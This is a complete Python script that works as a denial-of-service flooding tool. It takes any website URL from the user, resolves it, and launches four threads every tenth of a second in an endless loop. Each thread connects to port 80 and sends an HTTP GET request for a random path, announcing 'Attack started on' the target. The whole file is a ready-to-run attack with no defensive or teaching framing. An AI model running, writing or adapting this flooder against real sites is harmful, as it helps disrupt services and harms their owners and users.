import socket
import sys
import threading
import time
import string
import random


ip = ""
port = 80

try:
    host = input("[#]Put url of the website: ").replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except:
    print("Website error")
    sys.exit(2)

thread_num = 0
thread_num_mutex = threading.Lock()

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}]")
    sys.stdout.flush()
    thread_num_mutex.release()

def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

def attack():
    print_status()
    url_path = generate_url_path()

    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} ")

# Spawn a thread per request
all_threads = []
while(True):
    t1 = threading.Thread(target=attack)
    t2 = threading.Thread(target=attack)
    t3 = threading.Thread(target=attack)
    t4 = threading.Thread(target=attack)
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    all_threads.append(t1)
    all_threads.append(t2)
    all_threads.append(t3)
    all_threads.append(t4)

    time.sleep(0.1)
